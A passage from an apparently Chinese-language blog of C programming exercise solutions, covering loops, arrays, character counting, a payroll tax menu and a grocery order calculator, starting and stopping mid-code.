return 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li><p>编写一个程序，提示用户输入大写字母。使用嵌套循环以下面金字塔型的格式打印字母：<br>   A<br>  ABA<br> ABCBA<br>ABCDCBA<br>ABCDEDCBA<br>打印这样的图形，要根据用户输入的字母来决定。例如，上面的图形是在用户输入E后的打印结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_spaces(unsigned int n);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char uppercase_letter;</span><br><span class="line">    char c1, c2;</span><br><span class="line"></span><br><span class="line">    do      // get uppercase letter from user</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Enter an uppercases letter:&quot;);</span><br><span class="line">        scanf(&quot;%c&quot;, &amp;uppercase_letter);</span><br><span class="line">    &#125;while (uppercase_letter &lt; &#x27;A&#x27;|| &#x27;Z&#x27; &lt; uppercase_letter);</span><br><span class="line"></span><br><span class="line">    for(c1 = &#x27;A&#x27;; c1 &lt;= uppercase_letter; c1++)</span><br><span class="line">    &#123;</span><br><span class="line">        //print opening spaces</span><br><span class="line">        print_spaces(uppercase_letter -c1);</span><br><span class="line"></span><br><span class="line">        //print letter</span><br><span class="line">        //ascending</span><br><span class="line">        for (c2 = &#x27;A&#x27;; c2 &lt; c1; c2++)&#123;</span><br><span class="line">            printf(&quot;%c&quot;, c2);</span><br><span class="line">        &#125;</span><br><span class="line">        // descending</span><br><span class="line">        for (; &#x27;A&#x27; &lt;= c2; c2--)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;%c&quot;, c2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //print closing spaces</span><br><span class="line">        print_spaces(uppercase_letter - c1);</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_spaces(unsigned int n)&#123;</span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot; &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>考虑下面两个无限序列：<br>1.0 + 1.0/2.0 + 1.0/3.0 + 1.0/4.0 + …<br>1.0 - 1.0/2.0 + 1.0/3.0 - 1.0/4.0 + …<br>编写一个程序计算这两个无限序列的总和，直到到达某次数。提示：奇数个-1 相乘得-1，偶数个-1相乘得1。让用户交互地输入指定的次数，当用户输入0或负值时结束输入。查看运行100项、1000项、10000项后的总和，是否发现每个序列都收敛于某值？</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    long int limit;</span><br><span class="line">    float sign = 1.0f;</span><br><span class="line">    float series1 = 0, series2 = 0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Enter a number of terms to sum:&quot;);</span><br><span class="line">    scanf(&quot;%ld&quot;, &amp;limit);</span><br><span class="line"></span><br><span class="line">    for (double i = 1; i &lt;= limit; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        series1 += 1.0f/i;</span><br><span class="line">        series2 += (1.0f/i) * sign;</span><br><span class="line">        sign = -sign;   // toggle sign</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;The %ldth partial sum for series 1 is: %.5f\n&quot;, limit, series1);</span><br><span class="line">    printf(&quot;The %ldth partial sum for series 2 is: %.5f\n&quot;, limit, series2);</span><br><span class="line"></span><br><span class="line">    //Answer: Series 1 has no limit. Series 2 appears to be bouned above</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个程序，创建两个包含8个元素的double类型数组，使用循环提示用户为第一个数组输入8 个值。第二个数组元素的值设置为第一个数组对应元素的累积之和。例如，第二个数组的第 4个元素的值是第一个数组前4个元素之和，第二个数组的第5个元素的值是第一个数组前5个元素之和（用嵌套循环可以完成，但是利用第二个数组的第5个元素是第二个数组的第4个元素与第一个数组的第5个元素之和，只用一个循环就能完成任务，不需要使用嵌套循环）。最后，使用循环显示两个数组的内容，第一个数组显示成一行，第二个数组显示在第一个数组的下一行，而且每个元素都与第一个数组各元素相对应。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int array[8], cumulative_sum[8];</span><br><span class="line">    int sum = 0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Enter 8 integers:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;array[i]);</span><br><span class="line">        sum += array[i];</span><br><span class="line">        cumulative_sum[i] = sum;</span><br><span class="line">    &#125;</span><br><span class="line">    //display loops</span><br><span class="line">    printf(&quot;Integers:      &quot;);</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%6d &quot;, array[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    printf(&quot;Cumulative sum:&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%6d &quot;, cumulative_sum[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个程序，读取一行输入，然后把输入的内容倒序打印出来。可以把输入储存在char类型的数组中，假设每行字符不超过255。回忆一下，根据%c转换说明，scanf()函数一次只能从输入中读取一个字符，而且在用户按下Enter键时scanf()函数会生成一个换行字符（\n）。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char line[255];</span><br><span class="line">    int i = 0;     // array</span><br><span class="line">    printf(&quot;Enter a line to reerse:\n&quot;);</span><br><span class="line">    while (scanf(&quot;%c&quot;, &amp;line[i]), line[i] != &#x27;\n&#x27;)</span><br><span class="line">        i++;</span><br><span class="line">    for (; 0 &lt;= i; i--)     //previous loop leaves i in right postion</span><br><span class="line">        printf(&quot;%c&quot;, line[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>line[i] != ‘\n’ 的条件判断使得循环在用户输入的行中包含换行符之前继续执行。当用户按下 Enter 键时，输入的换行符会被检测到，并导致循环结束。</li>
</ul>
<ol>
<li>编写一个统计单词数量的程序（即，该程序读取并报告单词的数量）。该程序还可以计算字符数和行数。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// wordcnt.c -- 统计字符数、单词数、行数</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;      //为isspace()函数提供原型</span><br><span class="line">#include &lt;stdbool.h&gt;    //为bool、true、false提供定义</span><br><span class="line">#define STOP &#x27;|&#x27;</span><br><span class="line">int main() &#123;</span><br><span class="line">    char c;                 //读入字符</span><br><span class="line">    char prev;              //读入的前一个字符</span><br><span class="line">    long n_chars = 0L;       //字符数</span><br><span class="line">    int n_lines = 0;        //行数</span><br><span class="line">    int n_words = 0;        //单词数</span><br><span class="line">    int p_lines = 0;        //不完整的行数</span><br><span class="line">    bool inword = false;    //如果c在单词中，inword等于true</span><br><span class="line">    printf(&quot;Enter text to be analyzed (| to terminate):\n&quot;);</span><br><span class="line">    prev = &#x27;\n&#x27;;            //用于识别完整的行</span><br><span class="line">    while ((c = getchar()) != STOP)</span><br><span class="line">    &#123;</span><br><span class="line">        n_chars++;          //统计字符  </span><br><span class="line">        if(c == &#x27;\n&#x27;)</span><br><span class="line">            n_lines++;     //统计行</span><br><span class="line">            if (!isspace(c) &amp;&amp; !inword)</span><br><span class="line">            &#123;</span><br><span class="line">                inword = true;  //开始一个新的单词</span><br><span class="line">                n_words++;      //统计单词</span><br><span class="line">            &#125;</span><br><span class="line">            if(isspace(c) &amp;&amp; inword)</span><br><span class="line">                inword = false;     //打到单词的末尾</span><br><span class="line">                prev = c;           //保存字符的值</span><br><span class="line">    &#125;</span><br><span class="line">    if(prev != &#x27;\n&#x27;)</span><br><span class="line">        p_lines = 1;</span><br><span class="line">    printf(&quot;characters = %ld, words = %d, lines = %d,&quot;,</span><br><span class="line">           n_chars, n_words, n_lines);</span><br><span class="line">    printf(&quot;partial lines = %d\n&quot;, p_lines);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写程序读取输入，读到#停止，报告ei出现的次数。</li>
</ol>
<ul>
<li>注意<br>该程序要记录前一个字符和当前字符。用“Receive your eieio award”这样的输入来测试。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line"></span><br><span class="line">#define STOP &#x27;#&#x27;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	char ch;</span><br><span class="line">	unsigned int ei_count = 0;</span><br><span class="line">	bool e_flag = false;</span><br><span class="line"></span><br><span class="line">	printf(&quot;This program reads input and counts the number of times the\n&quot;</span><br><span class="line">		   &quot;sequence &#x27;ei&#x27; occurs (case insensitive).\n&quot;);</span><br><span class="line">	printf(&quot;Enter input (%c to stop):\n&quot;, STOP);</span><br><span class="line"></span><br><span class="line">	while ((ch = getchar()) != STOP)</span><br><span class="line">	&#123;</span><br><span class="line">		ch = tolower(ch);</span><br><span class="line">		if (ch == &#x27;e&#x27;)</span><br><span class="line">			e_flag = true;</span><br><span class="line">		else if (ch == &#x27;i&#x27;)</span><br><span class="line">		&#123;</span><br><span class="line">			if (e_flag)</span><br><span class="line">				ei_count++;</span><br><span class="line">			e_flag = false;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">			e_flag = false;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;The sequence &#x27;ei&#x27; occurs %u times.\n&quot;, ei_count);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个程序，提示用户输入一周工作的小时数，然后打印工资总额、税金和净收入。做如下假设：<br>a.加班（超过40小时） = 1.5倍的时间<br>b.税率： 前300美元为15% <pre><code>  续150美元为20%
  余下的为25%
</code></pre></li>
</ol>
<p>让程序可以给出一个供选择的工资等级菜单。使用switch完成工资等级选择。运行程序后，显示的菜单应该类似这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*****************************************************************</span><br><span class="line">Enter the number corresponding to the desired pay rate or action:</span><br><span class="line">1) $8.75/hr         2) $9.33/hr</span><br><span class="line">2) $10.00/hr        4) $11.20/hr</span><br><span class="line">3) quit</span><br><span class="line">*****************************************************************</span><br></pre></td></tr></table></figure><br>如果选择 1～4 其中的一个数字，程序应该询问用户工作的小时数。程序要通过循环运行，除非用户输入 5。如果输入 1～5 以外的数字，程序应提醒用户输入正确的选项，然后再重复显示菜单提示用户输入。使用#define创建符号常量表示各工资等级和税率。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line"></span><br><span class="line">#define RATE_1 8.75</span><br><span class="line">#define RATE_2 9.33</span><br><span class="line">#define RATE_3 10.00</span><br><span class="line">#define RATE_4 11.20</span><br><span class="line"></span><br><span class="line">#define OVERTIME_HOURS 40.0</span><br><span class="line">#define OVERTIME_MULTIPLIER 1.5</span><br><span class="line">#define TAX_RATE_1 0.15</span><br><span class="line">#define TAX_BRACKET_1 300.0</span><br><span class="line">#define TAX_RATE_2 0.20</span><br><span class="line">#define TAX_BRACKET_2 450.0</span><br><span class="line">#define TAX_RATE_3 0.25</span><br><span class="line"></span><br><span class="line">void flush_input_buffer(void);</span><br><span class="line">float calculate_gross_pay(float hours, float rate);</span><br><span class="line">float calulate_taxes(float gross_pay);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    bool exit_flag = false;</span><br><span class="line">    int rate_option;</span><br><span class="line">    double rate, hours, gross_pay, taxes,net_pay;</span><br><span class="line"></span><br><span class="line">    while (1) &#123;</span><br><span class="line">        printf(&quot;*****************************************************************\n&quot;);</span><br><span class="line">        printf(&quot;Enter the number corresponding to the desired pay rate or action:\n&quot;);</span><br><span class="line">        printf(&quot;1) $8.75/hr                                       2) $9.33/hr\n&quot;);</span><br><span class="line">        printf(&quot;3) $10.00/hr                                      4) $11.20/hr\n&quot;);</span><br><span class="line">        printf(&quot;5) quit\n&quot;);</span><br><span class="line">        printf(&quot;*****************************************************************\n&quot;);</span><br><span class="line"></span><br><span class="line">        scanf(&quot;%d&quot;, &amp;rate_option);</span><br><span class="line">        switch (rate_option)</span><br><span class="line">        &#123;</span><br><span class="line">            case 1:</span><br><span class="line">                rate = RATE_1;</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                rate = RATE_2;</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">                rate = RATE_3;</span><br><span class="line">                break;</span><br><span class="line">            case 4:</span><br><span class="line">                rate = RATE_4;</span><br><span class="line">                break;</span><br><span class="line">            case 5:</span><br><span class="line">                exit_flag = true;</span><br><span class="line">                break;</span><br><span class="line">            default:        //invalid input</span><br><span class="line">                flush_input_buffer();</span><br><span class="line">                printf(&quot;please enter an integer between 1 and 5.\n&quot;);</span><br><span class="line">                continue;   // repeat main program loop</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (exit_flag)</span><br><span class="line">            break;      //exit program</span><br><span class="line"></span><br><span class="line">        printf(&quot;Enter the number of hours worked in a week:&quot;);</span><br><span class="line">        while (scanf(&quot;%lf&quot;, &amp;hours) != 1 || hours &lt;= 0)</span><br><span class="line">        &#123;</span><br><span class="line">            flush_input_buffer();</span><br><span class="line">            printf(&quot;please enter a positive number.\n&quot;);</span><br><span class="line">            printf(&quot;Enter number of hours worked in a week:&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gross_pay = calculate_gross_pay(hours, rate);</span><br><span class="line">        taxes = calulate_taxes(gross_pay);</span><br><span class="line">        net_pay = gross_pay - taxes;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Gross pay: $%.2f\n&quot;, gross_pay);</span><br><span class="line">        printf(&quot;Taxes pay: $%.2f\n&quot;, taxes);</span><br><span class="line">        printf(&quot;Net pay: $%.2f\n&quot;, net_pay);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Bye.\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void flush_input_buffer(void)</span><br><span class="line">&#123;</span><br><span class="line">    while (getchar() != &#x27;\n&#x27;)</span><br><span class="line">        ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float calculate_gross_pay(float hours, float rate)</span><br><span class="line">&#123;</span><br><span class="line">    if (hours &gt; OVERTIME_HOURS)</span><br><span class="line">        return OVERTIME_HOURS * rate + (hours - OVERTIME_HOURS) * rate * OVERTIME_MULTIPLIER;</span><br><span class="line">    else</span><br><span class="line">        return hours * rate;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float calulate_taxes(float gross_pay)</span><br><span class="line">&#123;</span><br><span class="line">    if (gross_pay &gt; TAX_BRACKET_2)</span><br><span class="line">        return TAX_RATE_3 * (gross_pay - TAX_BRACKET_2) + TAX_RATE_2 * (TAX_BRACKET_2 - TAX_BRACKET_1) + TAX_RATE_1 * TAX_BRACKET_1;</span><br><span class="line">    else if (gross_pay &gt; TAX_BRACKET_1)</span><br><span class="line">        return TAX_RATE_2 * (gross_pay - TAX_BRACKET_1) + TAX_RATE_1 * TAX_BRACKET_1;</span><br><span class="line">    else</span><br><span class="line">        return TAX_RATE_1 * gross_pay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>switch</code>语句中使用的表达式必须具有整数类型或枚举类型，或者是具有单个转换函数到整数或枚举类型的类类型，无法进行bool等逻辑运算。</li>
</ul>
<ol>
<li>ABC 邮购杂货店出售的洋蓟售价为 2.05美元/磅，甜菜售价为 115 美元/磅，胡萝卜售价为1.09美元/磅。在添加运费之前，100美元的订单有 5%的打折优惠。少于或等于5磅的订单收取 6.5 美元的运费和包装费，5磅~ 20 磅的订单收取14 美元的运费和包装费，超过 20 磅的订单在 14 美元的基础上每续重1磅增加 0.5 美元。</li>
</ol>
<p>编写一个程序，在循环中用 switch 语句实现用户输入不同的字母时有不同的响应，即输入a的响应是让用户输入洋蓟的磅数，b 是甜菜的磅数，c 是胡萝人的磅数，q 是退出订购。程序要记录累计的重量。即，如果用户输入 4磅的甜菜，然后输入 5磅的甜菜，程序应报告9 磅的甜菜。然后，该程序要计算货物总价、折扣(如果有的话) 、运费和包装费。随后，程序应显示所有的购买信息: 物品售价、订购的重量(单位:磅) 、订购的蔬菜费用、订单的总费用、折扣(如果有的话)、运费和包装费，以及所有的费用总额。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line"></span><br><span class="line">#define ARTICHOKE_PRICE_PER_LB 2.05</span><br><span class="line">#define BEET_PRICE_PER_LB 1.15</span><br><span class="line">#define CARROT_PRICE_PER_LB 1.09</span><br><span class="line"></span><br><span class="line">#define TRANSPORT_5LB 6.50</span><br><span class="line">#define TRANSPORT_20LB 14.00</span><br><span class="line">#define TRANSPORT_OVER_20_RATE 0.5</span><br><span class="line"></span><br><span class="line">#define DISCOUNT_RATE 0.05</span><br><span class="line"></span><br><span class="line">void flush_input_buffer(void);</span><br><span class="line">float calculate_transport(float weight);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    float artichokeWeight = 0, beetWeight = 0, carrotWeight = 0, totalWeight;</span><br><span class="line">    float artichokePrice, beetPrice, carrotPrice, subtotal, discount, transport, total;</span><br><span class="line">    bool discount_flag;</span><br><span class="line">    float weight;</span><br><span class="line">    char option;</span><br><span class="line"></span><br><span class="line">    while (1)&#123;</span><br><span class="line">        printf(&quot;What would you like to order?\n&quot;);</span><br><span class="line">        printf(&quot;a) artichoke    b) beet     c) carrot   q) quit\n&quot;);</span><br><span class="line">        option = getchar();</span><br><span class="line">        switch(option)</span><br><span class="line">        &#123;</span><br><span class="line">            case (&#x27;q&#x27;):</span><br><span class="line">                printf(&quot;Bye.\n&quot;);</span><br><span class="line">                return 0;       //exit program</span><br><span class="line"></span><br><span class="line">            case (&#x27;a&#x27;): //artichokes</span><br><span class="line">                        printf(&quot;How many pound of artichokes would you like to add?&quot;);</span><br><span class="line">                        if (scanf(&quot;%f&quot;, &amp;weight) == 1)</span><br><span class="line">                            artichokeWeight += weight;</span><br><span class="line">                        else</span><br><span class="line">                        &#123;</span><br><span class="line">                            flush_input_buffer();</span><br><span class="line">                            printf(&quot;Invalid input. Try again.\n&quot;);</span><br><span class="line">                            continue;       //repeat main program loop</span><br><span class="line">                        &#125;</span><br><span class="line">                        break;</span><br><span class="line"></span><br><span class="line">                        case (&#x27;b&#x27;): //beets</span><br><span class="line">                            printf(&quot;How many pounds of beets would you like to add?&quot;);</span><br><span class="line">                            if (scanf(&quot;%f&quot;, &amp;weight) == 1)</span><br><span class="line">                                beetWeight += weight;</span><br><span class="line">                            else</span><br><span class="line">                            &#123;</span><br><span class="line">                                flush_input_buffer();</span><br><span class="line">                                printf(&quot;Invalid input. Try again.\n&quot;);</span><br><span class="line">                                continue;       //repeat main program loop</span><br><span class="line">                            &#125;</span><br><span class="line">                            